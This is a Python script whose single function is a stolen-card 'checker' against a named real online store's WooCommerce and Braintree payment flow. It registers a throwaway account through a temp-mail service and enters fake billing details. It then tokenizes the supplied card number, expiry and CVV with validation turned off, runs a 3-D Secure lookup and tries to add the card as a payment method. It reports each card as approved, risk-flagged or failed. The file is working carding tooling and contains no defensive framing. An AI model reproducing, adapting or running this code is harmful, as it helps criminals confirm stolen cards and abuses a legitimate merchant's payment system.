def chk(card):

	import requests
	import re
	import base64
	import random
	import string
	import user_agent
	import time
	from requests_toolbelt.multipart.encoder import MultipartEncoder

	from requests.packages.urllib3.exceptions import InsecureRequestWarning

	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]

	r1 = requests.session()

	r2 = requests.session()

	user = user_agent.generate_user_agent()

	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'user-agent': user,
	}

	response = r1.get('https://temp-mail.random-gen.com/', headers=headers)

	acc = re.search(
    r'&quot;params&quot;:\[&quot;(.*?)&quot;\]',
     response.text).group(1)

	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'user-agent': user,
}

	response = r2.get('https://store.ie.edu/my-account/', headers=headers)

	nonce = re.search(
    r'name="woocommerce-register-nonce" value="(.*?)"',
     response.text).group(1)

	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': user,
}

	data = {
    'email': acc,
    'password': '#Andro765',
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://store.ie.edu/my-account/',
    'wc_order_attribution_session_start_time': '2024-10-02 19:28:23',
    'wc_order_attribution_session_pages': '2',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': user,
    'terms': 'on',
    'terms-field': '1',
    'woocommerce-register-nonce': nonce,
    '_wp_http_referer': '/my-account/',
    'register': 'Register',
    'user_msg': '',
}

	response = r2.post(
    'https://store.ie.edu/my-account/',
    headers=headers,
     data=data)

	time.sleep(5)

	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'user-agent': user,
	}

	response = r1.get(
    'https://temp-mail.random-gen.com/',
    cookies=r1.cookies,
     headers=headers)

	num = re.search(r'inbox/(\d+)', response.text).group(1)

	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}

	res = r1.get(f'https://mailtemp.dev/inbox/{num}/body', headers=headers)
	def capture(string, start, end):
                 start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
                 return (
        string[start_pos + len(start): end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

	lol = capture(
            res.text,
            'vlus',
            '"',
        )
        

	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'user-agent': user,
}
	

	url = f'https://store.ie.edu/my-account/?vlus{lol}'

	url = url.replace('&amp;', '&')
	print(url)

	res = r2.get(url, headers=headers)

	nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', res.text).group(1)

	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': user,
}

	data = {
    'username': acc,
    'password': '#Andro765',
    'woocommerce-login-nonce': nonce,
    '_wp_http_referer': '/my-account/',
    'login': 'Log in',
    'redirect': 'https://store.ie.edu/my-account/',
    'user_msg': '',
}

	response = r2.post('https://store.ie.edu/my-account/', headers=headers, data=data)

	
#3


	headers = {
    'authority': 'store.ie.edu',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'referer': 'https://store.ie.edu/my-account/edit-address/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = requests.get('https://store.ie.edu/my-account/edit-address/billing/', cookies=r2.cookies, headers=headers)

	address = (re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1))
	
#4


	headers = {
    'authority': 'store.ie.edu',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://store.ie.edu',
    'pragma': 'no-cache',
    'referer': 'https://store.ie.edu/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'billing_email': 'moh5527vbnm@gmail.com',
    'billing_first_name': 'bbxbcbb',
    'billing_last_name': 'hhxbfbb',
    'billing_phone': '2153652415',
    'billing_company': 'bbxbcbb hhxbfbb',
    'billing_country': 'US',
    'billing_address_1': 'hhfhfbfv',
    'billing_address_2': '',
    'billing_city': 'hfhdvvxv',
    'billing_state': 'NY',
    'billing_postcode': '10080',
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce': address,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
    'user_msg': '',
}

	response = requests.post('https://store.ie.edu/my-account/edit-address/billing/', cookies=r2.cookies, headers=headers, data=data)
#5

	headers = {
    'authority': 'store.ie.edu',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'referer': 'https://store.ie.edu/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = requests.get('https://store.ie.edu/my-account/add-payment-method/', cookies=r2.cookies, headers=headers)

	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)

	dec = base64.b64decode(enc).decode('utf-8')

	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)


#6


	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'da085fd2-2be5-4f06-9f73-f3fb66c742ca',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'hhfhfbfv',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
#7


	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://store.ie.edu',
    'pragma': 'no-cache',
    'referer': 'https://store.ie.edu/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'amount': '0.00',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'ar-EG',
    'browserScreenHeight': 867,
    'browserScreenWidth': 381,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'ipAddress': '102.191.121.177',
        'billingLine1': 'hhfhfbfv',
        'billingLine2': '',
        'billingCity': 'hfhdvvxv',
        'billingState': 'NY',
        'billingPostalCode': '10080',
        'billingCountryCode': 'US',
        'billingPhoneNumber': '2153652415',
        'billingGivenName': 'bbxbcbb',
        'billingSurname': 'hhxbfbb',
        'email': 'moh5527vbnm@gmail.com',
    },
    'bin': '461046',
    'dfReferenceId': '0_9c042252-7324-40db-ad40-81c6972eb29a',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.106.0',
        'cardinalDeviceDataCollectionTimeElapsed': 1860,
        'issuerDeviceDataCollectionTimeElapsed': 3832,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': au,
    'braintreeLibraryVersion': 'braintree/web/3.106.0',
    '_meta': {
        'merchantAppId': 'store.ie.edu',
        'platform': 'web',
        'sdkVersion': '3.106.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': 'da085fd2-2be5-4f06-9f73-f3fb66c742ca',
    },
}

	response = requests.post(
    f'https://api.braintreegateway.com/merchants/jq8x8vgv6wc36qph/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)

	nonco = response.json()['paymentMethod']['nonce']



#8

	headers = {
    'authority': 'store.ie.edu',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://store.ie.edu',
    'pragma': 'no-cache',
    'referer': 'https://store.ie.edu/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': nonco,
    'braintree_cc_device_data': '',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/jq8x8vgv6wc36qph/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/jq8x8vgv6wc36qph"},"merchantId":"jq8x8vgv6wc36qph","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"IE","currencyCode":"EUR","merchantIdentifier":"jq8x8vgv6wc36qph","supportedNetworks":["visa","mastercard","amex"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI5NzljODM0NC1kMzJiLTRkNTctYWNhMi1kYjlmOTliNGRmZjYiLCJpYXQiOjE3Mjc5MjY4NTcsImV4cCI6MTcyNzkzNDA1NywiaXNzIjoiNWM2Yzg1OTc4MjNjMTYyMWJjZGViYzMxIiwiT3JnVW5pdElkIjoiNWEzN2Y0M2M1MTJjZmIyMzg0OWI0OWRjIn0._1afxldFhBphILRQ5LlclE6rQYNKtMYlNHbuCL-__v0"},"androidPay":{"displayName":"IE Publishing","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjgwMTMyNTcsImp0aSI6IjkxNmM3NGRiLWI4YTAtNDZmMS1iYTUxLTBjZGNkYTM3NWU2YyIsInN1YiI6ImpxOHg4dmd2NndjMzZxcGgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImpxOHg4dmd2NndjMzZxcGgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.EFZw8wwD_99gP7GtGS_5qpSCNJ39YHTA_mcv2oB1JoWVjM8Gie2mAbt7dekoFYz7DZl1JsXW4xDenBuwwNQc0A","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex"]},"paypalEnabled":true,"paypal":{"displayName":"IE Publishing","clientId":"ASZ18y9YRjCdL0khds4Uaux1VVcbDMw4avyOcT9YoxUPOsHm2uQDwEXB68tdXvZr-fxMcIcPXdEDf4ub","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"tiendaonlineEUR","payeeEmail":null,"currencyIsoCode":"EUR"}}',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
    'user_msg': '',
}

	response = requests.post('https://store.ie.edu/my-account/add-payment-method/', cookies=r2.cookies, headers=headers, data=data)
	pattern = r'Reason: (.*?)\s*</li>'
    
	text = response.text
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	
